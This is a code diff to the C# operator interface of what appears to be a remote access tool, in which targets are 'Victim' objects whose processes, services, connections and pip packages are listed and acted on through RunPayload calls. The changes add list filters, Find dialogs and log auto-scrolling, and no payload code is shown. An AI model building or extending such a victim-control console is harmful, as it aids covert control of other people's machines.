@@ -1199,11 +1199,19 @@ namespace Reception
 
         public void SystemStatus(string msg)
         {
-            Invoke(new Action(() => richTextBox1.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n")));
+            Invoke(new Action(() =>
+            {
+                richTextBox1.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
+                richTextBox1.ScrollToCaret();
+            }));
         }
         public void TransportStatus(string msg)
         {
-            Invoke(new Action(() => richTextBox2.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n")));
+            Invoke(new Action(() =>
+            {
+                richTextBox2.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
+                richTextBox2.ScrollToCaret();
+            }));
         }
         public void KeyExchangeStatus(Victim v, string msg)
         {
@@ -1219,6 +1227,7 @@ namespace Reception
                     _item.SubItems.Add(msg);
                     _item.Tag = v;
                     listView4.Items.Add(_item);
+                    _item.EnsureVisible();
                 }
                 else
                 {
@@ -1229,7 +1238,11 @@ namespace Reception
         }
         public void ErrorLogs(string msg)
         {
-            Invoke(new Action(() => richTextBox3.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n")));
+            Invoke(new Action(() => 
+            { 
+                richTextBox3.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
+                richTextBox3.ScrollToCaret(); 
+            }));
         }
 
         //STATUS [END]
@@ -1395,42 +1408,121 @@ namespace Reception
             return (ts, tv, editor, output);
         }
 
-        //CONENCTION - FILTER
-        public void conn_Filter(conn_F filter)
+        //PIP MANAGER - FILTER
+        public void pip_Filter(pip_F filter, Victim v)
         {
-            Victim v = GetVictimInCurrentTab();
-            var _var = conn_GetControls();
-            connFilter_AddItem();
-            _var.lv.Items.Clear();
-        }
-        private void connFilter_AddItem()
-        {
+            TabPage page = FindTabPage(v, Function.pip_Manager);
+            if (page == null)
+                return;
 
+            tabControl2.SelectedTab = page;
+            var x = pip_GetControls(v);
+            List<ListViewItem> list = new List<ListViewItem>();
+            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
+            x.lv.Items.Clear();
+            foreach (ListViewItem item in list)
+            {
+                if (filter.regex)
+                {
+                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
+                        continue;
+                }
+                else
+                {
+                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
+                        continue;
+                }
+
+                x.lv.Items.Add(item);
+            }
+            MessageBox.Show("Match : " + x.lv.Items.ToString(), "pip Manager - Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+        //CONENCTION - FILTER
+        public void conn_Filter(conn_F filter, Victim v)
+        {
+            TabPage page = FindTabPage(v, Function.Connection);
+            if (page == null)
+                return;
+
+            tabControl2.SelectedTab = page;
+            var x = conn_GetControls();
+            List<ListViewItem> list = new List<ListViewItem>();
+            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
+            x.lv.Items.Clear();
+            foreach (ListViewItem item in list)
+            {
+                if (filter.regex)
+                {
+                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
+                        continue;
+                }
+                else
+                {
+                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
+                        continue;
+                }
+
+                x.lv.Items.Add(item);
+            }
+            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Conn Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
         //SERVICE - FILTER
-        public void serv_Filter(serv_F filter)
+        public void serv_Filter(serv_F filter, Victim v)
         {
-            Victim v = GetVictimInCurrentTab();
-            var _var = serv_GetControls();
-            servFilter_AddItem();
-            _var.lv.Items.Clear();
-        }
-        private void servFilter_AddItem()
-        {
+            TabPage page = FindTabPage(v, Function.Service);
+            if (page == null)
+                return;
 
+            tabControl2.SelectedTab = page;
+            var x = serv_GetControls();
+            List<ListViewItem> list = new List<ListViewItem>();
+            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
+            x.lv.Items.Clear();
+            foreach (ListViewItem item in list)
+            {
+                if (filter.regex)
+                {
+                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
+                        continue;
+                }
+                else
+                {
+                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
+                        continue;
+                }
+
+                x.lv.Items.Add(item);
+            }
+            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Serv Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
         //PROCESS - FILTER
-        public void proc_Filter(Proc_F filter)
+        public void proc_Filter(Proc_F filter, Victim v)
         {
-            Victim v = GetVictimInCurrentTab();
-            var _var = proc_GetControls();
-            procFilter_AddItem();
-            _var.lv.Items.Clear();
-        }
-        private void procFilter_AddItem()
-        {
-            Victim v = GetVictimInCurrentTab();
-            var _var = proc_GetControls();
+            TabPage page = FindTabPage(v, Function.Process);
+            if (page == null)
+                return;
+
+            tabControl2.SelectedTab = page;
+            var x = proc_GetControls();
+            List<ListViewItem> list = new List<ListViewItem>();
+            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
+            x.lv.Items.Clear();
+            foreach (ListViewItem item in list)
+            {
+                if (filter.regex)
+                {
+                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
+                        continue;
+                }
+                else
+                {
+                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
+                        continue;
+                }
+
+                x.lv.Items.Add(item);
+            }
+            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Proc Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
         //FILE - FILTER
         public void file_Filter(file_F filter)
@@ -1997,6 +2089,15 @@ namespace Reception
             var _var = pip_GetControls(v);
             _var.lv.Items.Clear();
             v.RunPayload("pip_Mgr", v, new string[] { "l" });
+        }
+        private void pipBtn_Find(object sender, EventArgs e)
+        {
+            Victim v = GetVictimInCurrentTab();
+            frmPipFind f = new frmPipFind();
+            f.Text = $@"pip Manager - Filter\\{v.ID}";
+            f.v = v;
+            f.f1 = this;
+            f.Show();
         }
         private void pipBtn_Install(object sender, EventArgs e)
         {
@@ -3353,6 +3454,7 @@ namespace Reception
                     TextEditorControl editor = new TextEditorControl();
 
                     ToolStripButton btn1 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "List", };
+                    ToolStripButton btn4 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Find", };
                     ToolStripButton btn2 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Install", };
                     ToolStripButton btn3 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Uninstall", };
 
@@ -3374,12 +3476,14 @@ namespace Reception
                     ts.Items.AddRange(new ToolStripItem[]
                     {
                         btn1, //LIST INSTALLED PACKAGE
+                        btn4, //FIND
                         btn2, //INSTALL
                         btn3, //UNINSTALL
                     });
 
                     //BUTTON
                     btn1.Click += pipBtn_List;
+                    btn4.Click += pipBtn_Find;
                     btn2.Click += pipBtn_Install;
                     btn3.Click += pipBtn_Uninstall;
 
@@ -4305,6 +4409,39 @@ namespace Reception
             {
                 lvExport2CSV(rPlugin_GetControls(GetVictimInCurrentTab()).lv, sfd.FileName);
             }
+        }
+
+        private void toolStripMenuItem97_Click(object sender, EventArgs e)
+        {
+            frmProcessFind f = new frmProcessFind();
+            f.f1 = this;
+            f.v = GetVictimInCurrentTab();
+            f.Text = $@"Proc Filter\\{f.v.ID}";
+            f.Show();
+        }
+
+        private void toolStripMenuItem98_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItem100_Click(object sender, EventArgs e)
+        {
+            frmServFind f = new frmServFind();
+            f.f1 = this;
+            f.v = GetVictimInCurrentTab();
+            f.Text = $@"Serv Filter\\{f.v.ID}";
+            f.Show();
+        }
+
+        private void toolStripMenuItem101_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItem102_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
